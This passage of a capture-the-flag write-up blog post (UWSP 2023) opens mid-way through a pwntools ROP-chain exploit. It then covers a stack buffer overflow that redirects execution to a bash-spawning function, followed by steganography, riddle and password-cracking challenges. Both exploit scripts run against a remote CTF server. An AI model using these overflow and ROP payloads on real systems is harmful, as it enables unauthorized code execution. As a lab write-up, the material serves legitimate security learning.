p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x0048ec70) # add rax, 1 ; ret
p += pack('<Q', 0x004012e3) # syscall

shellcode = p

nc_ed = pwn.remote('34.123.210.162', '20233')
nc_ed.recvuntil("Waiting for heart beat request...")
# nc_ed.sendline(p)
# nc_ed.interactive()

payload = b'1048:' + b'a' * 1032 # 1032 + 16 = 1048
nc_ed.sendline(payload)
# nc_ed.interactive()

nc_ed.recvuntil("a" * 1032)
canary_ish_thingy = nc_ed.read(8) # signed long integer = 8 bytes
# print("canary = ", canary_ish_thingy)
nc_ed.recvuntil("Waiting for heart beat request...")

### Test whether we actually reached and can overwrite local_10.
# payload += b'b' * 16
# nc_ed.sendline(payload)
# nc_ed.recvuntil("Waiting for heart beat request...")
# nc_ed.sendline(b'0:a')
# nc_ed.interactive() # *** stack smashing detected ***: terminated

### Test whether canary_ish_thingy is actually local_10
# payload += canary_ish_thingy
# nc_ed.sendline(payload)
# nc_ed.recvuntil("Waiting for heart beat request...")
# nc_ed.sendline(b'1:a')
# nc_ed.interactive() 
# It did. It returns Waiting for heart beat request...
# But apparently it sometimes end up getting an infinite loop?

print("len(shellcode)=", len(shellcode))

# new_payload = b'0:'
# new_payload += shellcode
# new_payload += b'a' * (1032 - len(shellcode))
# new_payload += canary_ish_thingy
# new_payload += b'b' * 16 # 8? 16?
# new_payload += pwn.p32(0x00401ec1) # b'\xc1\x1e\x40\x00'

# new_payload = b'1048:' # Gives infinite loop
new_payload = b'0:'
new_payload += b'a' * 1032
new_payload += canary_ish_thingy
new_payload += b'b' * 8
new_payload += shellcode

nc_ed.sendline(new_payload)
nc_ed.interactive()
```
{% endhighlight %}

</font>
</details>

### Time is but a Window

<font size="4">
<p>At this point, I hope you are not surprised or mad that there is no challenge description here.</p>
</font>

<font size="4">
<p>Let's start by again throwing <code>exploit3.bin</code> into Ghidra.</p>
</font>

<font size="4">
{% highlight C %}
undefined8 main(EVP_PKEY_CTX *param_1)

{
  init(param_1);
  greet();
  return 0;
}

void win(void)

{
  alarm(0);
  execl("/bin/bash","/bin/bash",0);
  return;
}


// helper functions

void greet(void)

{
  undefined local_18 [16];
  
  printf("Hello! What\'s your name?: ");
  get_string(local_18);
  printf("Nice to meet you %s!\n",local_18);
  return;
}

void get_string(long param_1)

{
  int iVar1;
  int local_c;
  
  local_c = 0;
  while( true ) {
    iVar1 = getchar();
    if ((char)iVar1 == '\n') break;
    *(char *)(local_c + param_1) = (char)iVar1;
    local_c = local_c + 1;
  }
  return;
}
{% endhighlight %}
</font>


<font size="4">
<p>I think this chal is simpler than the previous one, we are even given a function that executes <code>/bin/bash</code> for you. But it turns out you have to pay attention to details.</p>

<p><code>get_string()</code> function basically reads a string character-by-character until it reaches <code>\n</code>. One can infer that the size of the memory stack of <code>greet()</code> is 16 + 8 = 24 based on the length of the name (stored as <code>local_18</code>) which is 16. </p>

<p>void <code>win()</code> function executes <code>/bin/bash</code> and it comes right after <code>main()</code> function. So the goal is to overwrite the return address of <code>main()</code> to the address of <code>win()</code>. </p>
</font>

<center>
<img src="/image/uwsp_2023/TimeisbutaWindow-sol2.png">
</center>
<p></p>

<font size="4">
<p>Note also that, <code>main()</code> comes right after <code>greet()</code>.</p>
</font>


<center>
<img src="/image/uwsp_2023/TimeisbutaWindow-sol1.png">
</center>
<p></p>

<font size="4">
<p>So we can overflow <code>greet()</code> to change the address of <code>main()</code> to <code>win()</code>.</p>

<p>The address of <code>win()</code> is <code>0x13<u>cb</u></code>, <code>greet()</code> is <code>0x13<u>64</u></code>, and <code>main()</code> is <code>0x13<u>a8</u></code>.</p>

<p>Therefore, we can overflow the entire memory stack for <code>greet()</code>, reach <code>main()</code>, then change <code>a8</code> to <code>cb</code>.</p>
</font>

<font size="4">
{% highlight python %}
import pwn

nc_ed = pwn.remote('34.123.210.162', '20234')
name_len = 16
payload = b'a' * name_len + b'b' * 4 + b'c' * 4 + b'\xcb' 
nc_ed.recvuntil(":")
nc_ed.sendline(payload)
print(payload)
nc_ed.interactive()
{% endhighlight %}
</font>

<center>
<img src="/image/uwsp_2023/Timeis-sol3.png" width="70%" height="70%">
</center>
<p></p>

<font size="4">
<p><b>Flag: <code>poctf{uwsp_71m3_15_4_f4c702}</code></b></p>
</font>

## Stego

### Absence Makes Hearts Go Yonder

<center>
<img src="/image/uwsp_2023/Absence.png" width="70%" height="70%">
</center>

<p></p>

<font size="4">
<p>At this point, you should not be surprised what we should do first. And it actually worked again.</p>
</font>

<center>
<img src="/image/uwsp_2023/Absence_sol.png">
</center>

<p></p>

<font size="4">
<p><b>Flag: <code>poctf{uwsp_h342d_y0u_7h3_f1257_71m3}</code></b></p>
</font>

### An Invincible Summer

<font size="4">
<p>Evidently, Exploit wasn't the only chal category that I forgot to save the challenge description. </p>
</font>

<font size="4">
<p>Anyway, you are given a compressed folder <code>stego1.7z</code> of a bunch of pictures. </p>
</font>

<center>
<img src="/image/uwsp_2023/An_Invincible_Summer_1.png" width="70%" height="70%">
</center>

<p></p>

<font size="4">
<p>Every picture has a replica of itself except it is stored with a different file extension (png/jpg and bmp). So, we might be able to find something by subtracting/XOR-ing one file from the other. Using <a href="https://futureboy.us/stegano/compinput.html">Steganographic Comparator</a>, we get some positive outcomes. For example, here is the result of <code>hand.jpg</code> and <code>hand.bmp</code>:</p>
</font>

<center>
<img src="/image/uwsp_2023/compare4.png" width="40%" height="40%">
</center>

<p></p>

<font size="4">
<p>This is the indicator that the message was written in the first few lines of pixels of the image. In fact, that turns out to be the case actually (using <a href="https://www.aperisolve.com/">Aperi Solve</a>.</p>
</font>

<center>
<img src="/image/uwsp_2023/text_from_compare4.png">
</center>

<p></p>

<font size="4">
<p>But this doesn't give any helpful information about the flag... Also, some other pairs of pictures, like <code>mittens.bmp</code> and <code>mittens.jpg</code> showed a similar outcome:</p>
</font>

<center>
<img src="/image/uwsp_2023/compare7.png" width="40%" height="40%">
</center>

<p></p>

<font size="4">
<p>But neither <code>mittens.bmp</code> nor <code>mittens.jpg</code> had anything interesting in it. </p>

<p>I decided to just put every image into <a href="https://www.aperisolve.com/">Aperi Solve</a>, and I managed to get the flag from <code>lock.png</code>.</p>
</font>

<center>
<img src="/image/uwsp_2023/flag_from_compare6.png">
</center>

<p></p>

<font size="4">
<p>which is kind of funny because the difference between <code>lock.bmp</code> and <code>lock.png</code> is like, almost nothing (at least visual-wise):</p>
</font>

<center>
<img src="/image/uwsp_2023/compare6.png" width="60%" height="60%">
</center>

<p></p>

<font size="4">
<p>So I guess this method does not always work, especially for small strings.</p>
</font>

<font size="4">
<p><b>Flag: <code>poctf{uwsp_h342d_y0u_7h3_f1257_71m3}</code></b></p>
</font>

### Between Secrets and Lies

<font size="4">
<p>It is a stego chal. The picture matters, not the challenge description. (More seriously, yes, I again forgot to save the description. Sorry!)</p>
</font>

<font size="4">
<p>You have a picture of a can of beans, named <code>bean.png</code>.</p>
</font>

<center>
<img src="/image/uwsp_2023/bean.png" width="90%" height="90%">
</center>

<font size="4">
<p>I plugged this picture into every online stego tool that I could find, including but not limited to, <a href="https://www.aperisolve.com/">Aperi'Solve</a>, <a href="https://stylesuxx.github.io/steganography/">Steganography Online</a>, <a href="https://georgeom.net/StegOnline/upload">StegOnline</a>, <a href="https://futureboy.us/stegano/decinput.html">Steganographic Decoder</a>, another <a href="https://www.beautifyconverter.com/steganographic-decoder.php">Steganographic Decoder</a>; pretty much, you name it, I (probably) had tried it already. Unfortunately, none of them returned anything useful.</p>

<p>I then thought this might be LSB steganography. I downloaded <a href="https://github.com/livz/cloacked-pixel">cloacked-pixel</a> and ran it with <code>bean.png</code> as input, then I got this plot:</p>
</font>

<center>
<img src="/image/uwsp_2023/bean-lsb.png" width="70%" height="70%">
</center>

<font size="4">
<p>
Based on this plot, it is quite unlikely that the flag was hidden in LSB. This crosses out LSB steganography from our list.
</p>

<p>Another possibility is that there was a hidden file embedded into some pixels of this picture. That means, it is time to <a href="https://github.com/zed-0xff/zsteg">zsteg</a> it. Just running <code>zsteg bean.png</code> only returned</p>
{% highlight python %}
b1,b,lsb,xy         .. text: "hC-n-pc-"
b3,bgr,msb,xy       .. text: "(;>X\t)4k&"
b4,b,msb,xy         .. text: "Je(B#[mt"
{% endhighlight %}

<p>which isn't very helpful. But with <code>--all</code> flare, we get a lot of outputs. Some conspicuous ones were: </p>
{% highlight python %}
...
b2,r,lsb,xy,prime   .. file: OpenPGP Public Key
...
b6p,r,msb,xy,prime  .. file: OpenPGP Secret Key
b2,g,lsb,XY         .. file: 5View capture file
b2,g,msb,XY         .. file: VISX image file
...
b3,abgr,msb,XY      .. file: MPEG ADTS, layer III, v2,  16 kbps, Monaural
...
b4,g,msb,XY         .. text: "ffffffffwwwwwwwwUUUUUUUU"
...
b7p,g,lsb,YX,prime  .. file: PGP symmetric key encrypted data -
...
b3p,r,msb,yX        .. file: Quasijarus strong compressed data
...
b7,r,lsb,Yx         .. file: zlib compressed data
{% endhighlight %}
<p>I extracted all of them, not just the ones listed above (you can automate it using <a href="https://github.com/bannsec/stegoVeritas">stegoVeritas</a>), and I went through every file manually, but it turns out that they are all false positive.</p>

<p>After staring at the picture for days with no luck, I realized that there are some red dots on the top left corner of the picture.</p>
</font>

<center>
<img src="/image/uwsp_2023/bean-crop-2.png">
</center>

<font size="4">
    <p>Let me enlarge it for you (if you are a Ubuntu user, disable "Smooth images when zoomed out" in Preferences).</p>
</font>

<center>
<img src="/image/uwsp_2023/bean-crop-enlarged.png">
</center>

<p></p>

<font size="4">
    <p>This is definitely something unusual. I think it is either a Morse code or binary code. Also, at the end of this sequence of red pixels, there are some blue pixels as well.</p>
</font>

<center>
<img src="/image/uwsp_2023/bean-crop-enlarged-2.png">
</center>

<p></p>

<font size="4">
    <p>We can start off by converting each pixel to 1 and the rest to 0. The red sequence can be represented as </p>
    <p>
    <code>01110000 01101111 01100011 01110100 01100110 01111011 01110101 01110111 01110011 01110000 01011111 01101101 00110000 01110010 00110011 01011111 01101000 01110101 01101101 00110100 01101110 01011111 00110111 01101000 00110100 01101110 01011111 01101000 01110101 01101101 00110100 01101110 01011111 00110001 00110101 01011110 00110000 00010001 00100000</code>
    </p>
    <p>And the blue sequence at the end is</p>
    <p><code>11000101 01000110 11010000 01001001 01100111 11100100 01100100 01100111 11000001</code></p>
    <p>So the red sequence in fact was a binary code, except some data near the end was damaged.</p>
</font>

<center>
<img src="/image/uwsp_2023/binary-cyberchef.png">
</center>

<p></p>

<font size="4">
<p>But unfortunately, the blue sequence is not even a valid binary string.</p>
</font>

<center>
<img src="/image/uwsp_2023/binary-cyberchef-2.png">
</center>

<p></p>

<font size="4">
<p>In fact, an 8-digit binary number should not start with 1 if it is an encoding of an ASCII symbol, according to binary-to-ASCII conversion tables. That said, the binary number for curly bracket "}" is <code>01111101</code>. So <code>01111101</code> should be somewhere. The blue sequence ends with <code>11000001</code> and <code>11000001 XOR 01111101 = 10111100</code>. So maybe, <code>10111100</code> is the key? But then this will make some numbers in the sequence start with 1, which as said should not happen. Padding the beginning and end of the sequence with some zeroes also did not help, because there always will be a binary number that starts with 1. Combining the red and blue sequence (writing both red and blue as 1, and so on) also did not work.</p>

<p>After wasting a week on this, I found this stego tool called <a href="https://wiki.bi0s.in/steganography/stegsolve/">Stegsolve</a> that I decided to try as a last resort (I was going to give up after this if this does not work). After some troubleshooting (I found <a href="https://stackoverflow.com/a/75232089/13362299">this StackOverflow post</a> helpful), I managed to get it run on my machine. Then, since the message was encoded using red pixels, I selected the maximum possible "Red" on the bit planes, then...</p>
</font>


<center>
<img src="/image/uwsp_2023/bean-sol.png">
</center>

<p></p>

<font size="4">
    <p>Yes, I finally found the flag.</p>
</font>

<font size="4">
<p><b>Flag: <code>poctf{uwsp_m0r3_hum4n_7h4n_hum4n_15_0ur_m0770}</code></b></p>
</font>

<font size="4">
    <p>Even till this day, I have no idea how we can solve this problem using <a href="https://wiki.bi0s.in/steganography/stegsolve/">Stegsolve</a>. Although I learned a lot about stego while working on this problem, I am not particularly happy (maybe I'm just salty) that a use of tool trivialized this problem. But I suppose stego chals are just mostly like that, and still, I enjoyed working on this challenge!</p>
</font>


## Misc

### Sight Without Vision 

<center>
<img src="/image/uwsp_2023/Sight_Without_Vision.png" width="70%" height="70%">
</center>

<p></p>

<font size="4">
<p>Flag format is <code>poctf{uwsp_ _ _ }</code>---three underscores with three blanks. So probably the answer consists of three words.</p>

<p>The sentence in the description "You have one, too. You carry it everywhere you go but it's not heavy" is a famous riddle with the answer "name."</p>

<p>So maybe the 'name' of this problem, "Sight Without Vision" but with Leet Speak which is "519h7 w17h0u7 v1510n" (that was what that "this" in the challenge description was for) is the answer. And that was indeed correct!</p>
</font>

<font size="4">
<p><b>Flag: <code>poctf{uwsp_519h7_w17h0u7_v1510n}</code></b></p>
</font>

## Etc.

<font size="4">
<p>Other than these challenges that I described in this post, I solved two more challenges: one Misc (<i>Here You See A Passer By</i>) and one OSINT (<i>All is Green and Comfort</i>). </p>

<p><i>Here You See A Passer By</i> was a typical 2D maze problem that you likely have done in elementary school. This challenge was worth more than <i>Sight Without Vision</i>, and had less solves than crypto problems (<i>Unquestioned and Unrestrained</i> and <i>Missing and Missed</i>), which I found quite surprising.</p>

<p><i>All is Green and Comfort</i> was pretty simple. The challenge description said that somebody leaked a secret on their website, so Archive (wayback machine) is the most canonical approach and that indeed was the solution.</p>

<p>I could not figure out one Crack challenge <i>We Mighty, We Meek</i>.</p>
</font>

<center>
<img src="/image/uwsp_2023/We_mighty.png" width="70%" height="70%">
</center>

<p></p>

<font size="4">
<p>This definitely is a <a href="https://www.openwall.com/john/">John the Ripper</a> challenge (in particular, <a href="https://github.com/openwall/john/blob/bleeding-jumbo/run/office2john.py">office2john</a>). </p> 
</font>

<center>
<img src="/image/uwsp_2023/wemighty-1.png">
</center>

<p></p>

<center>
<img src="/image/uwsp_2023/wemighty-2.png">
</center>

<p></p>

<center>
<img src="/image/uwsp_2023/wemighty-3.png">
</center>

<p></p>


<font size="4">
<p>But despite my best efforts, I couldn't even get anywhere near the solution. I must have done something wrong, inefficient, and/or irrelevant, but I am not sure what I could've or should've done differently. Given that this challenge is worth less than the other two Crack challenges that I managed to solve, I guess I was in a completely wrong direction.</p>
</font>
